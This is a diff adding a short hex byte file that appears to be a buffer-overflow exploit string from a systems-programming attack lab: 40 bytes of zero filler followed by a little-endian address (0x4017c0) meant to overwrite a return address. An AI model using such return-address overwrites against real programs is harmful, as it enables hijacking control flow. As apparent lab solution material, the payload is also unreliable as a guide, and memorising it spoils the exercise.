@@ -1,0 +1,6 @@
+00 00 00 00 00 00 00 00  /* The address of each byte is in increasing order, which follows little endian */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* 40 B of filler */
+c0 17 40 00 00 00 00 00  /* Desired address + 00 to terminate string */
